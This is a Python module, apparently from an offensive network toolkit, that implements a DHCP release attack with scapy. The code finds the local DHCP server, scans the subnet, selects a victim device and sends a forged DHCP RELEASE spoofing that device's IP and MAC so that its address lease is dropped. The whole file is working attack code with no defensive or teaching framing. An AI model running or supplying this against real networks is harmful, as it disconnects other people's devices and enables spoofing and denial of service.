from attacks.base import BaseAttack
from recon.network_scan import scan_subnet
from recon.target_selector import select_device
from recon.dhcp_discover import find_dhcp_server
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, mac2str

class ReleaseAttack(BaseAttack):
    """
    DHCP Release Attack.
    Sends DHCP RELEASE messages to the server, releasing leases for specified IPs.
    """

    def __init__(self, iface, logger=None):
        super().__init__(iface, logger)
        self.target_ip = None
        self.target_mac = None
        self.server_ip = None
        self.server_mac = None

    def send_dhcp_release(self, iface: str, client_ip: str, client_mac: str, server_ip: str, server_mac: str):
        pkt = (
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,
                ciaddr=client_ip,
                chaddr=mac2str(client_mac),
            )
            / DHCP(
                options=[
                    ("message-type", "release"),
                    ("server_id", server_ip),
                    "end",
                ]
            )
        )

        sendp(pkt, iface=iface, verbose=False)

    def run(self):
        try:
            self.logger.info("Discovering DHCP server on interface %s...", self.iface)
            device_info = find_dhcp_server(self.iface)
            self.server_ip, self.server_mac = device_info["ip"], device_info["mac"]
            self.logger.info("DHCP server found: IP=%s MAC=%s", self.server_ip, self.server_mac)

            self.logger.info("Scanning subnet for devices...")
            devices = scan_subnet(self.iface)

            self.logger.info("Selecting target device to release lease from...")
            selection = select_device(devices, server_ip=self.server_ip)
            self.logger.info("Selected target device: IP=%s MAC=%s", selection["target_ip"], selection["target_mac"])

            self.target_ip, self.target_mac = selection["target_ip"], selection["target_mac"]
            self.logger.info("Sending DHCP RELEASE for IP: %s", self.target_ip)
            self.send_dhcp_release(
                iface=self.iface,
                client_ip=self.target_ip,
                client_mac=self.target_mac,
                server_ip=self.server_ip,
                server_mac=self.server_mac,
            )
            self.logger.info("DHCP RELEASE sent successfully for IP: %s", self.target_ip)
        except RuntimeError as e:
            self.logger.error(str(e))
            return
